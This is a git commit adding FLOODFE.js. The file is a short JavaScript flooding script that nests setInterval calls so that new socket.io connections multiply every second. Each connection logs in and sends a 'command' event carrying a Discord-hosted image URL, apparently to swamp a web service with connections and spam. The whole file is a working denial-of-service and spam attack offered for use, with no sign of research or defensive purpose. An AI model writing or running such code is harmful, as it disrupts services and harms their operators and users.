06345869cc072306b6dcd309e2389e63b794983d
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2025-09-18 23:31:29 +0300

    Create FLOODFE.js

---
+++ FLOODFE.js
@@ -0,0 +1,51 @@
+setInterval(() => {
+    const socket = io("//");
+    socket.emit("client", "MAIN");
+    socket.emit("login", {
+        name: "FALSE"
+    , });
+    socket.emit("command", {
+        list: ["agent", "https://cdn.discordapp.com/attachments/1417237899392585769/1417523111338840195/D9IAg3Mi9ysJIYi1SDnedJe17OzPEsPcG0I8Fo.png?ex=68cd6dc6&is=68cc1c46&hm=4135cd6280040a04777cdb9e1d54af9d90a6ebdec242e1df34fed8848f764359&"]
+    });
+    setInterval(() => {
+        const socket = io("//");
+        socket.emit("client", "MAIN");
+        socket.emit("login", {
+            name: "FALSE"
+        , });
+        socket.emit("command", {
+            list: ["agent", "https://cdn.discordapp.com/attachments/1417237899392585769/1417523111338840195/D9IAg3Mi9ysJIYi1SDnedJe17OzPEsPcG0I8Fo.png?ex=68cd6dc6&is=68cc1c46&hm=4135cd6280040a04777cdb9e1d54af9d90a6ebdec242e1df34fed8848f764359&"]
+        });
+        setInterval(() => {
+            const socket = io("//");
+            socket.emit("client", "MAIN");
+            socket.emit("login", {
+                name: "FALSE"
+            , });
+            socket.emit("command", {
+                list: ["agent", "https://cdn.discordapp.com/attachments/1417237899392585769/1417523111338840195/D9IAg3Mi9ysJIYi1SDnedJe17OzPEsPcG0I8Fo.png?ex=68cd6dc6&is=68cc1c46&hm=4135cd6280040a04777cdb9e1d54af9d90a6ebdec242e1df34fed8848f764359&"]
+            });
+            setInterval(() => {
+                const socket = io("//");
+                socket.emit("client", "MAIN");
+                socket.emit("login", {
+                    name: "FALSE"
+                , });
+                socket.emit("command", {
+                    list: ["agent", "https://cdn.discordapp.com/attachments/1417237899392585769/1417523111338840195/D9IAg3Mi9ysJIYi1SDnedJe17OzPEsPcG0I8Fo.png?ex=68cd6dc6&is=68cc1c46&hm=4135cd6280040a04777cdb9e1d54af9d90a6ebdec242e1df34fed8848f764359&"]
+                });
+                setInterval(() => {
+                    const socket = io("//");
+                    socket.emit("client", "MAIN");
+                    socket.emit("login", {
+                        name: "FALSE"
+                    , });
+                    socket.emit("command", {
+                        list: ["agent", "https://cdn.discordapp.com/attachments/1417237899392585769/1417523111338840195/D9IAg3Mi9ysJIYi1SDnedJe17OzPEsPcG0I8Fo.png?ex=68cd6dc6&is=68cc1c46&hm=4135cd6280040a04777cdb9e1d54af9d90a6ebdec242e1df34fed8848f764359&"]
+                    });
+                    
+                }, 1000)
+            }, 1000)
+        }, 1000)
+    }, 1000)
+}, 1000)
